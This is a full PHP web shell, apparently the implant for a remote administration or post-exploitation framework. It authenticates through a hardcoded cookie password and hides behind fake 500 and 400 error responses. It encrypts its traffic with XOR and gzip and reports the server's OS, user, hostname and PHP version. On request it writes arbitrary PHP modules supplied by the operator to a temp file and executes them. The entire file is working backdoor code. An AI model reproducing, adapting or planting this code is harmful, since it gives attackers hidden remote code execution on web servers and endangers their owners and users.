<?php

error_reporting(E_ALL);
ini_set('display_errors', 'on');

class Handler
{
    public  $REQUEST_METHOD                  = "POST";
    private $PASSWORD_TYPE                   = "COOKIE";
    private $PASSWORD_KEY                    = "X-Authorization";
    private $PASSWORD_VALUE                  = "P4ssw0rd!";
    private $REQUEST_DATA_TYPE               = "FIELD";
    private $REQUEST_DATA_KEY                = "data";
    private $RESPONSE_DATA_KEY               = "data";

    private $SUCC_CODE                       = "0";
    private $ERR_CODE                        = "1";
    private $FIELD_SEPARATOR                 = ",";
    private $VALUE_SEPARATOR                 = "=";
    private $CUSTOM_SEPARATOR                = "|";

    private $REQ_ACTION_KEY                  = "action";
    private $REQ_MSG_KEY                     = "data";

    private $REQ_MOD_NAME_KEY                = "name";
    private $REQ_MOD_CONTENT_KEY             = "content";
    private $REQ_MOD_ARGS_KEY                = "args";
    private $REQ_MOD_CWD_KEY                 = "cwd";

    private $MOD_ARGS_VAR                    = "#{ARGS}";
    private $MOD_CWD_VAR                     = "#{CWD}";

    private $RES_STATUS_KEY                  = "status";
    private $RES_MESSAGE_KEY                 = "message";

    private $ACTION_STATUS                   = "0";
    private $ACTION_INVOKE                   = "1";

    private $MOD_RES_STATUS                  = "status";
    private $MOD_RES_MESSAGE                 = "message";

    private $ERR_INVALID_REQ_TYPE            = "invalid request type";
    private $ERR_INVALID_REQ_METHOD          = "invalid request method";
    private $ERR_NONEXISTENT_DATA            = "non-existent data";
    private $ERR_NONEXISTENT_ACTION          = "non-existent action";
    private $ERR_UNKNOWN_ACTION              = "unknown action code";
    private $ERR_EXCEPTION_FROM_MODULE       = "module throw an exception";
    private $ERR_NONEXISTENT_ACTION_DATA     = "non-existent action data";
    private $ERR_INVALID_ACTION_DATA         = "invalid action data";
    private $ERR_NONEXISTENT_MOD_NAME        = "non-existent module name";
    private $ERR_NONEXISTENT_MOD_CONTENT     = "non-existent module content";
    private $ERR_NONEXISTENT_MOD_ARGS        = "non-existent module args";
    private $ERR_NONEXISTENT_MOD_CWD         = "non-existent module cwd";
    private $ERR_INVALID_MOD_CONTENT         = "invalid module content";
    private $ERR_INVALID_MOD_ARGS            = "invalid module args";
    private $ERR_INVALID_MOD_CWD             = "invalid module cwd";
    private $ERR_INVALID_MODULE_RESP_DATA    = "invalid module response data";
    private $ERR_NONEXISTENT_MOD_STATUS      = "non-existent module response status";
    private $ERR_NONEXISTENT_MOD_DATA        = "non-existent module response data";
    private $ERR_INVALID_MODULE_RESP_CONTENT = "invalid module response content";


    private function get_field($type, $name)
    {
        switch ($type)
        {
            case "HEADER":
                $header_name = "HTTP_" . str_replace("-", "_", strtoupper($name));
                if (!isset($_SERVER[$header_name]))
                    return null;
                return $_SERVER[$header_name];
            case "COOKIE":
                if (!isset($_COOKIE[$name]))
                    return null;
                return $_COOKIE[$name];
            case "FIELD":
                switch ($this->REQUEST_METHOD)
                {
                    case "GET":
                        if (!isset($_GET[$name]))
                            return null;
                        return $_GET[$name];
                    case "POST":
                        if (!isset($_POST[$name]))
                            return null;
                        return $_POST[$name];
                    default:
                        throw new Exception($this->ERR_INVALID_REQ_METHOD, 1);
                }
            default:
                throw new Exception($this->ERR_INVALID_REQ_TYPE, 1);
        }
    }

    private function encrypt($data)
    {
        $data_len = @strlen($data);
        $password_len = @strlen($this->PASSWORD_VALUE);
        for ($i = 0; $i < $data_len; $i++)
            $data[$i] = $data[$i] ^ $this->PASSWORD_VALUE[$i % $password_len];
        return $data;
    }

    private function protect($data)
    {
        $compressed = gzencode($data, 7);
        $data_crypt = $this->encrypt($compressed);
        $data_hex_str = @bin2hex($data_crypt);
        return $data_hex_str;
    }

    private function unprotect($data)
    {
        $data_crypt = @hex2bin($data);
        if ($data_crypt === false)
            throw new Exception("unprotect(): first hex2bin() failed to '$data'", 1);
        $data_raw_hex = $this->encrypt($data_crypt);
        $uncompressed = gzdecode($data_raw_hex);
        return $uncompressed;
    }

    private function generate_response($status, $message)
    {
        $response  = "";
        $response .= $this->RES_STATUS_KEY . $this->VALUE_SEPARATOR . $status . $this->FIELD_SEPARATOR;
        $response .= $this->RES_MESSAGE_KEY . $this->VALUE_SEPARATOR . @bin2hex($message);
        return $this->pack_value($this->RESPONSE_DATA_KEY, $this->protect($response), true);
    }

    private function unpack_data($packed_request)
    {
        $fields = explode($this->FIELD_SEPARATOR, $packed_request);
        if (sizeof($fields) < 1)
            throw new Exception("unpack_data(): err explode() fields < 1", 1);

        $data = array();
        foreach ($fields as $field)
        {
            $vals = explode($this->VALUE_SEPARATOR, $field);
            if (sizeof($vals) !== 2)
                throw new Exception("unpack_data(): err explode() values !== 2", 1);

            $data[$vals[0]] = $vals[1];
        }
        return $data;
    }

    private function pack_value($key, $value, $end=false)
    {
        if ($end)
            return $key . $this->VALUE_SEPARATOR .$value;
        else
            return $key . $this->VALUE_SEPARATOR . @bin2hex($value);
    }

    private function get_so()
    {
        $uname_val = explode(" ", php_uname());
        return $uname_val[0];
    }

    private function get_username()
    {
        $phpuname_fields = explode(" ", php_uname());
        if ($phpuname_fields[0] === "Windows")
            return @php_uname('n') . "\\" . getenv("username");

        $user_id = @posix_getuid();
        $user_info = @posix_getpwuid($user_id);
        return $user_info['name'];
    }

    public function authenticate()
    {
        try
        {
            $request_password = $this->get_field($this->PASSWORD_TYPE, $this->PASSWORD_KEY);
            if ($request_password === null)
                return False;
            if ($request_password !== $this->PASSWORD_VALUE)
                return False;
        }
        catch (Exception $e)
        {
            return False;
        }
        return True;
    }

    private function do_status()
    {
        $response  = "";
        $response .= $this->pack_value("so", $this->get_so());
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->pack_value("pwd", str_replace("\\", "/", getcwd()));
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->pack_value("type", "php");
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->pack_value("version", phpversion());
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->pack_value("user", $this->get_username());
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->pack_value("hostname", @php_uname('n'));
        return $this->generate_response($this->SUCC_CODE, $response);
    }

    private function replace_template_vars($content, $args, $cwd)
    {
        $content = str_replace($this->MOD_ARGS_VAR, $args, $content);
        $content = str_replace($this->MOD_CWD_VAR, $cwd, $content);
        return $content;
    }

    private function do_invoke($unpacked_request)
    {
        if (!array_key_exists($this->REQ_MSG_KEY, $unpacked_request))
            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_ACTION_DATA);

        $action_data = @hex2bin($unpacked_request[$this->REQ_MSG_KEY]);
        if ($action_data === false)
            return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_ACTION_DATA);

        $action_data_unpack = $this->unpack_data($action_data);
        if (!array_key_exists($this->REQ_MOD_NAME_KEY, $action_data_unpack))
            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_MOD_NAME);
        if (!array_key_exists($this->REQ_MOD_CONTENT_KEY, $action_data_unpack))
            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_MOD_CONTENT);
        if (!array_key_exists($this->REQ_MOD_ARGS_KEY, $action_data_unpack))
            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_MOD_ARGS);
        if (!array_key_exists($this->REQ_MOD_CWD_KEY, $action_data_unpack))
            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_MOD_CWD);

        $mod_content = @hex2bin($action_data_unpack[$this->REQ_MOD_CONTENT_KEY]);
        if ($mod_content === false)
            return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_MOD_CONTENT);
        $mod_args = @hex2bin($action_data_unpack[$this->REQ_MOD_ARGS_KEY]);
        if ($mod_args === false)
            return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_MOD_ARGS);
        $mod_cwd = @hex2bin($action_data_unpack[$this->REQ_MOD_CWD_KEY]);
        if ($mod_cwd === false)
            return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_MOD_CWD);

        $mod_content_with_vars = $this->replace_template_vars($mod_content, $action_data_unpack[$this->REQ_MOD_ARGS_KEY], $mod_cwd);

        $mod_response_hex = "";
        try
        {
            ob_start();
            $temp_file = tmpfile();
            $temp_filepath = stream_get_meta_data($temp_file)['uri'];
            file_put_contents($temp_filepath, substr($mod_content_with_vars, 1));
            include $temp_filepath;
            unlink($temp_filepath);
            $mod_response_hex = ob_get_contents();
            ob_end_clean();
        }
        catch (ParseError $e)
        {
            throw new Exception("eval() parse error: " . $e->getMessage(), 1);
        }

        $mod_response = @hex2bin($mod_response_hex);
        if ($mod_response === false)
            throw new Exception($this->ERR_INVALID_MODULE_RESP_DATA . ": " . @bin2hex($mod_response_hex), 1);

        $mod_response_unpack = $this->unpack_data($mod_response);
        if (!array_key_exists($this->MOD_RES_STATUS, $mod_response_unpack))
            throw new Exception($this->ERR_NONEXISTENT_MOD_STATUS, 1);
        if (!array_key_exists($this->MOD_RES_MESSAGE, $mod_response_unpack))
            throw new Exception($this->ERR_NONEXISTENT_MOD_DATA, 1);

        $mod_status = $mod_response_unpack[$this->MOD_RES_STATUS];

        if (strpos($mod_response_unpack[$this->MOD_RES_MESSAGE], $this->CUSTOM_SEPARATOR) !== false)
            $mod_data = $mod_response_unpack[$this->MOD_RES_MESSAGE];
        else
            $mod_data = @hex2bin($mod_response_unpack[$this->MOD_RES_MESSAGE]);

        if ($mod_data === false)
            throw new Exception($this->ERR_INVALID_MODULE_RESP_CONTENT, 1);

        return $this->generate_response($mod_status, $mod_data);
    }

    public function handle()
    {
        try
        {
            $raw_request_data = $this->get_field($this->REQUEST_DATA_TYPE, $this->REQUEST_DATA_KEY);
            if ($raw_request_data === null)
                return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_DATA);

            $request_data = $this->unprotect($raw_request_data);
            $unpacked_request = $this->unpack_data($request_data);

            if (!array_key_exists($this->REQ_ACTION_KEY, $unpacked_request))
                return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_ACTION);

            switch ($unpacked_request[$this->REQ_ACTION_KEY])
            {
                case $this->ACTION_STATUS:
                    return $this->do_status();
                case $this->ACTION_INVOKE:
                    return $this->do_invoke($unpacked_request);
                default:
                    return $this->generate_response($this->ERR_CODE, $this->ERR_UNKNOWN_ACTION);
            }
        }
        catch (Exception $e)
        {
            return $this->generate_response($this->ERR_CODE, $this->ERR_EXCEPTION_FROM_MODULE . PHP_EOL . $e);
        }
    }
}

$handler = new Handler();

if ($_SERVER['REQUEST_METHOD'] !== $handler->REQUEST_METHOD)
{
    header($_SERVER['SERVER_PROTOCOL'] . ' 400 Bad Request', true, 400);
    exit();
}

if (!$handler->authenticate())
{
    header($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error', true, 500);
    exit();
}

$response = $handler->handle();
print($response);
